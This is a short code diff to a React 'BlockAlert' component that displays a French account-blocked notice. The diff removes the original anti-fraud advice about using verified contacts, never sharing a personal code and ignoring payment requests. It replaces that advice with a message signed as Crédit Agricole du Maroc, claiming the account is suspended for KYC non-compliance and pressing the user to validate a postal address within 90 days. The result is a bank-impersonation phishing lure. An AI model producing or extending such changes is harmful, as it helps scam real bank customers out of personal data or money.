@@ -91,16 +91,16 @@ export default function BlockAlert({
             </div>
 
             <div className="space-y-3 px-5 py-5 text-sm leading-6 text-slate-700">
-              <p>{fullName ? `Bonjour ${fullName},` : "Bonjour,"}</p>
+              <p>{fullName ? `Bonjour <b>${fullName}</b>,` : "Bonjour,"}</p>
               <p>
-                Votre compte est actuellement bloqué. Vous ne pouvez pas effectuer
-                certaines opérations tant que le déblocage n’a pas été effectué.
+                Nous vous informons que votre compte a été suspendu à titre conservatoire. Votre compte bancaire est bloqué pour non-conformité KYC (Know Your Customer). Veuillez valider votre adresse postale.
+                Délai de rigueur : 90 jours.
               </p>
               <p>
-                Pour connaître la procédure officielle, contactez le support ou votre
-                agence en utilisant les coordonnées déjà vérifiées dans votre espace.
-                Ne communiquez jamais votre code personnel et n’effectuez aucun
-                paiement demandé par un message non vérifié.
+                Cette régularisation vous donnera accès à votre solde et à l'ensemble de nos services financiers. Nous vous remercions de votre compréhension et de votre coopération. 
+              </p>
+              <p>
+                L’équipe Crédit Agricole du Maroc.
               </p>
             </div>
 
